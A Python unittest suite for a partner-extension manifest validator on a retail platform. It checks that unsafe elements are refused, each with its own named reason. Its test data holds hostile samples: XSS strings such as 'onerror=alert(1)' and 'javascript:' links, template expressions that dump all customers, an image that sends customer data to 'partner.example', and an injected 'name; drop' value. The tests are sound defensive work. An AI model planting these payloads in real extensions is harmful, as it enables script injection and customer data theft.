"""Validator tests — stdlib only, no bench:  python3 -m unittest discover -s tools/manifest/tests -v

Each good manifest passes; each forbidden element, planted into an otherwise good manifest, is refused with
its own named reason (and with nothing else, so a refusal can never be satisfied by a different rule firing)."""

import copy
import json
import pathlib
import sys
import unittest

HERE = pathlib.Path(__file__).resolve().parent
ROOT = HERE.parents[2]                       # Partner_Programme/
sys.path.insert(0, str(HERE.parent))
from validate import validate  # noqa: E402

S2 = json.loads((ROOT / "samples/s2_bins/manifest.json").read_text())
S1 = json.loads((ROOT / "samples/s1_warranty/manifest.json").read_text())
FULL = json.loads((HERE / "fixtures/full_ok.json").read_text())


def planted(change):
    m = copy.deepcopy(FULL)
    change(m)
    return validate(m)


class GoodManifests(unittest.TestCase):
    def test_s1_s2_and_every_allowed_kind_pass(self):
        for name, m in (("S1", S1), ("S2", S2), ("full", FULL)):
            self.assertEqual(validate(m), [], name)

    def test_a_url_shortcut_to_a_listed_address_passes(self):
        m = copy.deepcopy(FULL)
        m["workspaces"][0]["shortcuts"].append({"type": "URL", "url": m["allowed_urls"][0], "label": "Partner"})
        self.assertEqual(validate(m), [])


# (label, change to FULL, a phrase the ONE refusal's reason must contain)
FORBIDDEN = [
    ("server script", lambda m: m.update(server_scripts=[{"name": "PP TST x"}]), "server script runs partner code"),
    ("client script", lambda m: m.update(client_scripts=[{"name": "PP TST x"}]), "client script runs partner code"),
    ("web page", lambda m: m.update(web_pages=[{"name": "PP TST x"}]), "web page is published"),
    ("web template", lambda m: m.update(web_templates=[{"name": "PP TST x"}]), "web template puts partner markup"),
    ("an unknown kind", lambda m: m.update(kanban_boards=[{"name": "PP TST x"}]), "not a kind a manifest may carry"),
    # what leaves the shop ("partners will not see what is in the tenant")
    ("a webhook with its own body", lambda m: m["webhooks"][0].update(json='{"all": "{{ frappe.get_all(\'Customer\') }}"}'),
     "fixed, thin body"),
    ("a print format loading an outside image", lambda m: m["print_formats"][0].update(
        html='<img src="https://partner.example/p.png?c={{ doc.customer }}">'), "load anything from outside"),
    ("a print format loading an outside font", lambda m: m["print_formats"][0].update(
        css="@import url(//fonts.example/x.css);"), "load anything from outside"),
    ("a notification reading the shop's other data", lambda m: m["notifications"][0].update(
        message="{{ frappe.get_all('Customer') }}"), "its own record's fields only"),
    ("a notification copied to an outside address", lambda m: m["notifications"][0]["recipients"].append(
        {"cc": "me@partner.example"}), "never to an address"),
    ("a v2 kind in a v1 manifest", lambda m: m.update(reports=[{"name": "PP TST x"}]), "needs manifest_version 2"),
    ("mandatory on an engine record", lambda m: m["property_setters"].append(
        {"doc_type": "Sales Invoice", "field_name": "customer", "property": "reqd", "value": "1"}), "mandatory"),
    ("read-only on an engine record", lambda m: m["property_setters"].append(
        {"doc_type": "Sales Invoice", "field_name": "customer", "property": "read_only", "value": "1"}), "read-only"),
    ("hidden on an engine record", lambda m: m["property_setters"].append(
        {"doc_type": "Item", "field_name": "item_name", "property": "hidden", "value": "1"}), "hiding a field"),
    ("another engine-field property", lambda m: m["property_setters"].append(
        {"doc_type": "Item", "field_name": "item_name", "property": "label", "value": "X"}),
     "only change the fields it adds itself"),
    ("hidden on its OWN field on an engine record", lambda m: m["property_setters"].append(
        {"doc_type": "Customer", "field_name": "pp_tst_flag", "property": "hidden", "value": "1"}), "hiding a field"),
    ("record type without the prefix", lambda m: m["doctypes"].append(
        {"name": "Warranty Record", "fields": [{"fieldname": "x", "fieldtype": "Data"}]}), "must start with its prefix"),
    ("print format without the prefix", lambda m: m["print_formats"][0].update(name="Card"), "must start with its prefix"),
    ("workspace without the prefix", lambda m: m["workspaces"][0].update(name="Space"), "must start with its prefix"),
    ("webhook without the prefix", lambda m: m["webhooks"][0].update(name="Hook"), "must start with its prefix"),
    ("notification without the prefix", lambda m: m["notifications"][0].update(name="Note"), "must start with its prefix"),
    ("sale detail without the prefix", lambda m: m["sale_attributes"][0].update(name="Reference"), "must start with its prefix"),
    ("engine field without the field prefix", lambda m: m["custom_fields"].append(
        {"dt": "Customer", "fieldname": "flag", "fieldtype": "Check", "label": "Flag"}),
     "must start with 'pp_tst_'"),
    ("a webhook to an address not listed", lambda m: m["webhooks"][0].update(url="https://elsewhere.example/x"),
     "only call an address the manifest lists"),
    ("a secret in the manifest", lambda m: m["webhooks"][0].update(secret="s3cret"), "carries no secret"),
    ("a submittable record type", lambda m: m["doctypes"][1].update(is_submittable=1), "submittable record type"),
    ("an HTML field", lambda m: m["doctypes"][1]["fields"].append(
        {"fieldname": "blurb", "fieldtype": "HTML", "options": "<b>x</b>"}), "HTML field shows its own markup"),
    ("a mandatory field on an engine record", lambda m: m["custom_fields"][0].update(reqd=1), "mandatory"),
    ("a custom block on a workspace", lambda m: m["workspaces"][0]["blocks"].append(
        {"type": "custom_block", "data": {"custom_block_name": "PP TST Block"}}), "custom block carries script"),
    ("script in a print format", lambda m: m["print_formats"][0].update(html="<img src=x onerror=alert(1)>"),
     "carrying script"),
    ("a script print format", lambda m: m["print_formats"][0].update(print_format_type="JS"), "only template print formats"),
    ("a required sale detail", lambda m: m["sale_attributes"][0].update(required=1), "required sale detail"),
    ("records open to visitors", lambda m: m["doctypes"][1].setdefault("permissions", []).append(
        {"role": "Guest", "read": 1}), "not signed in"),
    ("a notification to an outside service", lambda m: m["notifications"][0].update(channel="Slack"),
     "other channels send to an outside service"),
    ("a notification on an engine record type", lambda m: m["notifications"][0].update(document_type="Sales Invoice"),
     "runs inside every save of it"),
    ("a notification key it may not set", lambda m: m["notifications"][0].update(attach_print=1),
     "keys a manifest notification may not set"),
    ("a webhook condition on an engine record type", lambda m: m["webhooks"].append(
        {"name": "PP TST Sale hook", "doctype": "POS Invoice", "event": "on_submit",
         "url": "http://host.docker.internal:8129/never-called", "condition": "doc.loyalty_program.startswith('G')"}),
     "evaluated inside every save"),
    ("a single-record type", lambda m: m["doctypes"][1].update(issingle=1), "single-record type"),
    ("a tree record type", lambda m: m["doctypes"][1].update(is_tree=1), "tree record type"),
    ("a default on a field added to an engine record type", lambda m: m["custom_fields"][0].update(default="1"),
     "'default' is enforced on every save"),
    ("unique on a field added to an engine record type", lambda m: m["custom_fields"][0].update(unique=1),
     "'unique' is enforced on every save"),
    ("a save-enforced property on its own engine field", lambda m: m["property_setters"].append(
        {"doc_type": "Customer", "field_name": "pp_tst_flag", "property": "default", "value": "1"}),
     "'default' is enforced on every save"),
    ("a non-display property on its own engine field", lambda m: m["property_setters"].append(
        {"doc_type": "Customer", "field_name": "pp_tst_flag", "property": "options", "value": "x"}),
     "only change how its own field is shown"),
    ("a URL shortcut to an address not listed", lambda m: m["workspaces"][0]["shortcuts"].append(
        {"type": "URL", "url": "https://elsewhere.example/", "label": "Out"}), "only open an address the manifest lists"),
    ("app name not the prefix", lambda m: m.update(app="pp_other"), "the app name is the prefix"),
]


class Forbidden(unittest.TestCase):
    def test_each_forbidden_element_is_refused_with_its_reason(self):
        for label, change, phrase in FORBIDDEN:
            with self.subTest(label):
                refusals = planted(change)
                self.assertEqual(len(refusals), 1, f"{label}: {refusals}")
                self.assertIn(phrase, refusals[0]["reason"], f"{label}: {refusals[0]}")

    def test_every_refusal_names_where_and_why(self):
        m = copy.deepcopy(FULL)
        for _, change, _ in FORBIDDEN:
            change(m)
        refusals = validate(m)
        self.assertGreaterEqual(len(refusals), len(FORBIDDEN) - 1)   # two plants hit the same webhook row
        for r in refusals:
            self.assertTrue(r["reason"] and r["where"] is not None, r)


# --- Help addresses and an app's own record types -------------------------------------------------------------------
# Ported from the shop's own test of its checker (``HelpAddresses`` in its ``test_manifest_check.py``, at the commit
# EXPORT_SOURCES.md names), not copied byte for byte: the cases are the same, so the kit's checker refuses what the shop's
# does. A record type's help address and a field's help address are shown to the shop's users as links, so each is a safe
# https address (letters, digits and ``. _ ~ / -``, an optional ``#heading``, no query); a setter on the app's own record
# type changes only what the manifest could have set there itself; script is refused in any setter value, in a record
# type's description, in a field's label and in a shortcut; a workspace icon is an icon's name.


def _setter(doc_type, prop, value, field_name=None):
    p = {"doc_type": doc_type, "property": prop, "value": value, "property_type": "Data"}
    if field_name:
        p["field_name"] = field_name
    return lambda m: m["property_setters"].append(p)


DOCS = "https://docs.ivendnext.com/docs/retail-extensions/app#the-record"
HELP = "help address"
_OWN = "PP TST Record"

HELP_REFUSED = [
    ("a javascript: help address", _setter(_OWN, "documentation", "javascript:alert(1)"), HELP),
    ("a quote breaking out of the link", _setter(_OWN, "documentation", 'https://docs.ivendnext.com/x"onmouseover="alert(1)'), HELP),
    ("an http help address", _setter(_OWN, "documentation", "http://docs.ivendnext.com/x"), HELP),
    ("an upper-case scheme", _setter(_OWN, "documentation", "HTTPS://docs.ivendnext.com/x"), HELP),
    ("an encoded quote", _setter(_OWN, "documentation", "https://docs.ivendnext.com/x%22y"), HELP),
    ("an entity quote", _setter(_OWN, "documentation", "https://docs.ivendnext.com/x&quot;y"), HELP),
    ("a trailing newline", _setter(_OWN, "documentation", DOCS + "\n"), HELP),
    ("a space", _setter(_OWN, "documentation", "https://docs.ivendnext.com/a b"), HELP),
    ("a markup bracket", _setter(_OWN, "documentation", "https://docs.ivendnext.com/a<b>"), HELP),
    ("an unsafe documentation_url on its own field on a shop's record type",
     _setter("Customer", "documentation_url", "javascript:alert(1)", "pp_tst_flag"), HELP),
    ("issingle on its own record type", _setter(_OWN, "issingle", "1"), "single-record type"),
    ("is_submittable on its own record type", _setter(_OWN, "is_submittable", "1"), "submittable"),
    ("permissions on its own record type", _setter(_OWN, "permissions", "[]"), "may not change 'permissions'"),
    ("autoname on its own record type", _setter(_OWN, "autoname", "hash"), "may not change 'autoname'"),
    ("a script in its own record type's description", _setter(_OWN, "description", "<script>x</script>"), "script"),
    ("a sort field that is not a field name", _setter(_OWN, "sort_field", "name; drop"), "not a value"),
    ("an HTML field type on its own field", _setter(_OWN, "fieldtype", "HTML", "title"), "change 'fieldtype' in the record type"),
    ("options markup on its own field", _setter(_OWN, "options", "Open\nClosed", "title"), "change 'options' in the record type"),
    ("a script in its own field's description", _setter(_OWN, "description", "<img src=x onerror=alert(1)>", "title"), "script"),
    ("documentation on a shop's record type", _setter("Customer", "documentation", DOCS), "only change the fields it adds itself"),
    ("script in a shop field's help, by a setter", _setter("Customer", "description", "<script>x</script>", "pp_tst_flag"), "script"),
    ("script in a shop field's label, by a setter", _setter("Customer", "label", "<img src=x onerror=alert(1)>", "pp_tst_flag"), "script"),
    ("a list value hiding script", _setter(_OWN, "description", ["<img src=x onerror=alert(1)>"], "title"), "script"),
    ("script in a record type's description key", lambda m: m["doctypes"][1].update(description="<script>x</script>"), "script"),
    ("script in an added field's label key", lambda m: m["custom_fields"][0].update(label="<svg onload=alert(1)>"), "script"),
    ("a title field the record type does not have", _setter(_OWN, "title_field", "nope"), "one of this record type's fields"),
    ("a padded title field", _setter(_OWN, "title_field", " title"), "one of this record type's fields"),
    ("a search field the record type does not have", _setter(_OWN, "search_fields", "title, nope"), "separated by commas"),
    ("a lower-case sort order", _setter(_OWN, "sort_order", "asc"), "ASC or DESC"),
    ("a workspace icon breaking out of its attribute", lambda m: m["workspaces"][0].update(icon="x onmouseover=alert(1)"),
     "a workspace icon is an icon's name"),
    ("a workspace icon with a quote", lambda m: m["workspaces"][0].update(icon='x"y'), "a workspace icon is an icon's name"),
    ("a workspace icon past 40 characters", lambda m: m["workspaces"][0].update(icon="a" * 41), "a workspace icon is an icon's name"),
    ("markup in a shortcut label", lambda m: m["workspaces"][0]["shortcuts"][0].update(label='<a href="jav&#97;script:x">R</a>'),
     "plain text"),
    ("a shortcut's stats filter (run as script)",
     lambda m: m["workspaces"][0]["shortcuts"][0].update(stats_filter="(()=>{return {}})()"), "a shortcut carries only"),
    ("a shortcut's colour", lambda m: m["workspaces"][0]["shortcuts"][0].update(color='x"><b>'), "a shortcut carries only"),
    ("a shortcut with no label", lambda m: m["workspaces"][0]["shortcuts"][0].pop("label"), "needs a label"),
    ("a doc_view the framework does not have", lambda m: m["workspaces"][0]["shortcuts"][0].update(doc_view="Bogus<x>"),
     "doc_view is one of"),
]

HELP_PASSES = [
    ("a docs address with a #heading on its own record type", _setter(_OWN, "documentation", DOCS)),
    ("a docs page with no heading", _setter(_OWN, "documentation", "https://docs.ivendnext.com/docs/x")),
    ("documentation_url on its own field on a shop's record type", _setter("Customer", "documentation_url", DOCS, "pp_tst_flag")),
    ("documentation_url on its own record type's field", _setter(_OWN, "documentation_url", DOCS, "title")),
    ("a title field on its own record type", _setter(_OWN, "title_field", "title")),
    ("a sort order on its own record type", _setter(_OWN, "sort_order", "DESC")),
    ("a label on its own field", _setter(_OWN, "label", "Heading", "title")),
    ("a standard sort field", _setter(_OWN, "sort_field", "modified")),
    ("its own search fields", _setter(_OWN, "search_fields", "title, name")),
    ("a workspace icon by name", lambda m: m["workspaces"][0].update(icon="folder-normal")),
]


class HelpAddresses(unittest.TestCase):
    def test_each_unsafe_help_address_or_own_type_setter_is_refused(self):
        for label, change, phrase in HELP_REFUSED:
            with self.subTest(label):
                refusals = planted(change)
                self.assertEqual(len(refusals), 1, f"{label}: {refusals}")
                self.assertIn(phrase, refusals[0]["reason"], f"{label}: {refusals[0]}")

    def test_a_safe_help_address_and_a_display_setter_pass(self):
        for label, change in HELP_PASSES:
            with self.subTest(label):
                self.assertEqual(planted(change), [], label)

    def test_the_sample_with_help_addresses_passes(self):
        sample = json.loads((ROOT / "contracts/extension_contracts/samples/package_manifest/accepted/04_help_addresses.json")
                            .read_text())
        self.assertEqual(validate(sample["payload"]), [])
        self.assertTrue(any(s["property"] in ("documentation", "documentation_url") for s in sample["payload"]["property_setters"]))


if __name__ == "__main__":
    unittest.main()
